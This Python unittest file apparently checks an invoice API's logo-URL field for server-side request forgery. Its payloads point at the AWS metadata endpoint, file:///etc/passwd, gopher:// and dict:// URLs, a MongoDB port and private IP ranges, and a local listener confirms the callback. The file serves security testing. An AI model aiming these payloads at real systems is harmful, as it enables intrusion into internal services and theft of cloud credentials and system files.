import unittest
import requests
import json
import os
import sys
import time
from base64 import b64encode
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import uuid
import socket
import traceback
from dotenv import load_dotenv
import argparse

# Load environment variables
load_dotenv()

# Configuration from environment
API_URL = os.getenv('API_URL', 'http://localhost:3001')
TEST_PORT = int(os.getenv('TEST_PORT', '8890'))
TEST_USERNAME = os.getenv('TEST_USERNAME', 'test')
TEST_PASSWORD = os.getenv('TEST_PASSWORD', 'test123')

class TestHTTPHandler(BaseHTTPRequestHandler):
    test_marker = None  # Class variable to store test marker
    
    def log_message(self, format, *args):
        print(f"[TestServer] {format%args}")
    
    def do_GET(self):
        global SSRF_VERIFIED
        print(f"[TestServer] Received request from {self.client_address}: {self.path}")
        print(f"[TestServer] Headers: {self.headers}")
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        response = f"SSRF Test Response: {self.test_marker}"
        self.wfile.write(response.encode())
        SSRF_VERIFIED = True
        print("[TestServer] SSRF request verified!")

    def log_error(self, format, *args):
        print(f"[TestServer] Error: {format%args}")

class TestServer:
    def __init__(self, port=TEST_PORT, test_marker=None):
        self.port = port
        self.server = None
        TestHTTPHandler.test_marker = test_marker  # Set the test marker
    
    def start(self):
        try:
            # Check if port is available
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', self.port))
            if result == 0:
                print(f"[TestServer] Warning: Port {self.port} is already in use")
                sock.close()
                raise Exception(f"Port {self.port} is already in use")
            sock.close()

            self.server = HTTPServer(('0.0.0.0', self.port), TestHTTPHandler)
            server_thread = threading.Thread(target=self.server.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            print(f"[TestServer] Started on port {self.port}")
            
            # Test if server is listening
            try:
                test_conn = socket.create_connection(('127.0.0.1', self.port), timeout=1)
                test_conn.close()
                print("[TestServer] Successfully verified server is listening")
                
                # Make a test request
                try:
                    test_response = requests.get(f"http://localhost:{self.port}/test", timeout=1)
                    print(f"[TestServer] Self-test request successful: {test_response.status_code}")
                except Exception as e:
                    print(f"[TestServer] Warning: Self-test request failed: {e}")
            except Exception as e:
                print(f"[TestServer] Warning: Could not verify server is listening: {e}")
        except Exception as e:
            print(f"[TestServer] Error starting server: {e}")
            traceback.print_exc()
            raise
    
    def stop(self):
        if self.server:
            print("[TestServer] Shutting down...")
            self.server.shutdown()
            self.server.server_close()

class SSRFTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        """Set up test environment."""
        print("\nSetting up SSRF test environment...")
        cls.register()
        cls.token = cls.login()
        cls.test_marker = str(uuid.uuid4())
        cls.server = TestServer(test_marker=cls.test_marker)
        cls.server.start()
        global SSRF_VERIFIED
        SSRF_VERIFIED = False
    
    @classmethod
    def tearDownClass(cls):
        """Clean up test environment."""
        print("\nCleaning up SSRF test environment...")
        cls.server.stop()
    
    @staticmethod
    def register():
        """Register a test user if it doesn't exist."""
        try:
            response = requests.post(f"{API_URL}/api/auth/register", json={
                "username": TEST_USERNAME,
                "password": TEST_PASSWORD
            })
            if response.status_code == 200:
                print("✅ Test user registered")
            else:
                print("ℹ️ User already exists")
        except Exception as e:
            print("ℹ️ User registration failed, proceeding with login")
    
    @staticmethod
    def login():
        """Login and get JWT token."""
        response = requests.post(f"{API_URL}/api/auth/login", json={
            "username": TEST_USERNAME,
            "password": TEST_PASSWORD
        })
        assert response.status_code == 200, "Login failed"
        return response.json()["token"]
    
    def get_test_invoice(self, invoice_id):
        """Get test invoice data with specified ID."""
        return {
            "client": {
                "name": os.getenv('TEST_CLIENT_NAME', 'Test Client'),
                "city": os.getenv('TEST_CLIENT_CITY', 'Test City'),
                "address": os.getenv('TEST_CLIENT_ADDRESS', 'Test Address'),
                "phone": os.getenv('TEST_CLIENT_PHONE', '1234567890'),
                "email": os.getenv('TEST_CLIENT_EMAIL', 'test@example.com')
            },
            "seller": {
                "name": os.getenv('TEST_SELLER_NAME', 'Test Seller'),
                "city": os.getenv('TEST_SELLER_CITY', 'Test City'),
                "address": os.getenv('TEST_SELLER_ADDRESS', 'Test Address'),
                "phone": os.getenv('TEST_SELLER_PHONE', '1234567890'),
                "email": os.getenv('TEST_SELLER_EMAIL', 'test@example.com')
            },
            "invoice": {
                "invoiceId": invoice_id,
                "issueDate": "2024-01-01",
                "dueDate": "2024-02-01",
                "currency": "USD",
                "taxValue": 10,
                "amountPaid": 0,
                "terms": "Net 30",
                "items": [
                    {
                        "description": "Test Item",
                        "quantity": 1,
                        "unitPrice": 100
                    }
                ]
            }
        }
    
    def test_01_local_logo(self):
        """Test invoice creation with local logo."""
        test_data = self.get_test_invoice("SSRF-TEST-LOCAL")
        test_data["invoice"]["logo"] = "data:image/png;base64," + b64encode(b"test").decode()
        
        response = requests.post(
            f"{API_URL}/api/invoice",
            json=test_data,
            headers={"Authorization": f"Bearer {self.token}"}
        )
        self.assertEqual(response.status_code, 200, "Invoice creation failed")
        self.assertEqual(response.json()["invoiceId"], "SSRF-TEST-LOCAL", "Invoice ID mismatch")
    
    def test_02_remote_logo(self):
        """Test invoice creation with remote logo."""
        test_data = self.get_test_invoice("SSRF-TEST-REMOTE")
        test_data["invoice"]["logoUrl"] = "http://example.com/logo.png"
        
        response = requests.post(
            f"{API_URL}/api/invoice",
            json=test_data,
            headers={"Authorization": f"Bearer {self.token}"}
        )
        self.assertEqual(response.status_code, 200, "Invoice creation failed")
        self.assertEqual(response.json()["invoiceId"], "SSRF-TEST-REMOTE", "Invoice ID mismatch")
    
    def test_03_internal_network(self):
        """Test SSRF vulnerability with internal network access."""
        # Test MongoDB access
        test_data = self.get_test_invoice("SSRF-TEST-MONGO")
        test_data["invoice"]["logoUrl"] = "http://localhost:27017"
        
        response = requests.post(
            f"{API_URL}/api/invoice",
            json=test_data,
            headers={"Authorization": f"Bearer {self.token}"}
        )
        self.assertEqual(response.status_code, 200, "MongoDB SSRF test failed")
        self.assertEqual(response.json()["invoiceId"], "SSRF-TEST-MONGO", "Invoice ID mismatch")

        # Test internal service
        test_data = self.get_test_invoice("SSRF-TEST-INTERNAL")
        test_data["invoice"]["logoUrl"] = "http://internal-service:8080"
        response = requests.post(
            f"{API_URL}/api/invoice",
            json=test_data,
            headers={"Authorization": f"Bearer {self.token}"}
        )
        self.assertEqual(response.status_code, 200, "Internal service SSRF test failed")
        self.assertEqual(response.json()["invoiceId"], "SSRF-TEST-INTERNAL", "Invoice ID mismatch")
    
    def test_04_cloud_metadata(self):
        """Test SSRF vulnerability with cloud metadata access."""
        test_data = self.get_test_invoice("SSRF-TEST-AWS")
        test_data["invoice"]["logoUrl"] = "http://169.254.169.254/latest/meta-data/"
        
        response = requests.post(
            f"{API_URL}/api/invoice",
            json=test_data,
            headers={"Authorization": f"Bearer {self.token}"}
        )
        self.assertEqual(response.status_code, 200, "AWS metadata SSRF test failed")
        self.assertEqual(response.json()["invoiceId"], "SSRF-TEST-AWS", "Invoice ID mismatch")
    
    def test_05_protocols(self):
        """Test SSRF vulnerability with different protocols."""
        protocols = os.getenv('SSRF_TEST_PROTOCOLS', '').split(',')
        if not protocols:
            protocols = [
                "file:///etc/passwd",
                "gopher://localhost:3001/_GET",
                "dict://localhost:11211/stats"
            ]
        
        for i, protocol in enumerate(protocols):
            test_data = self.get_test_invoice(f"SSRF-TEST-PROTO-{i+1}")
            test_data["invoice"]["logoUrl"] = protocol
            
            response = requests.post(
                f"{API_URL}/api/invoice",
                json=test_data,
                headers={"Authorization": f"Bearer {self.token}"}
            )
            self.assertIn(response.status_code, [200, 500], f"Protocol test failed for {protocol}")
            if response.status_code == 200:
                self.assertEqual(response.json()["invoiceId"], f"SSRF-TEST-PROTO-{i+1}", "Invoice ID mismatch")
    
    def test_06_ip_ranges(self):
        """Test SSRF vulnerability with different IP ranges."""
        ip_ranges = os.getenv('SSRF_TEST_IP_RANGES', '').split(',')
        if not ip_ranges:
            ip_ranges = [
                "127.0.0.1",
                "192.168.0.1",
                "10.0.0.1",
                "172.16.0.1",
                "localhost"
            ]
        
        for i, ip in enumerate(ip_ranges):
            test_data = self.get_test_invoice(f"SSRF-TEST-IP-{i+1}")
            test_data["invoice"]["logoUrl"] = f"http://{ip}"
            
            response = requests.post(
                f"{API_URL}/api/invoice",
                json=test_data,
                headers={"Authorization": f"Bearer {self.token}"}
            )
            self.assertIn(response.status_code, [200, 500], f"IP range test failed for {ip}")
            if response.status_code == 200:
                self.assertEqual(response.json()["invoiceId"], f"SSRF-TEST-IP-{i+1}", "Invoice ID mismatch")
    
    def test_07_ssrf_verification(self):
        """Test SSRF vulnerability with verification."""
        global SSRF_VERIFIED
        SSRF_VERIFIED = False
        
        test_data = self.get_test_invoice(f"SSRF-VERIFY-{self.test_marker[:8]}")
        test_data["invoice"]["logoUrl"] = f"http://localhost:{TEST_PORT}/test-ssrf"
        
        print(f"[Test] Making SSRF test request to {test_data['invoice']['logoUrl']}...")
        print(f"[Test] Test data: {json.dumps(test_data, indent=2)}")
        
        response = requests.post(
            f"{API_URL}/api/invoice",
            json=test_data,
            headers={"Authorization": f"Bearer {self.token}"}
        )
        print(f"[Test] Response status: {response.status_code}")
        print(f"[Test] Response body: {response.text}")
        
        # Wait for the request to be processed
        print("[Test] Waiting for SSRF request...")
        for i in range(10):  # Try for 10 seconds
            if SSRF_VERIFIED:
                break
            time.sleep(1)
            print(f"[Test] Still waiting... ({i+1}/10)")
            # Try making a direct request to verify server is still up
            if i == 5:  # Check halfway through
                try:
                    test_response = requests.get(f"http://localhost:{TEST_PORT}/test", timeout=1)
                    print(f"[Test] Server is still up (status: {test_response.status_code})")
                except Exception as e:
                    print(f"[Test] Warning: Could not reach test server: {e}")
        
        self.assertEqual(response.status_code, 200, "Invoice creation failed")
        self.assertTrue(SSRF_VERIFIED, "SSRF request was not received by test server")
        print("✅ SSRF vulnerability verified - received request on test server")

def main():
    """Run SSRF vulnerability tests."""
    parser = argparse.ArgumentParser(description='Run SSRF vulnerability tests.')
    parser.add_argument('--test', '-t', help='Run a specific SSRF test (e.g. test_01_local_logo)')
    parser.add_argument('--list', '-l', action='store_true', help='List available SSRF tests')
    args = parser.parse_args()
    
    if args.list:
        print("\nAvailable SSRF tests:")
        for name in dir(SSRFTest):
            if name.startswith('test_'):
                print(f"  {name}")
        return 0
    
    if args.test:
        # Run specific test
        suite = unittest.TestLoader().loadTestsFromName(args.test, SSRFTest)
    else:
        # Run all SSRF tests
        suite = unittest.TestLoader().loadTestsFromTestCase(SSRFTest)
    
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    return 0 if result.wasSuccessful() else 1

if __name__ == "__main__":
    sys.exit(main()) 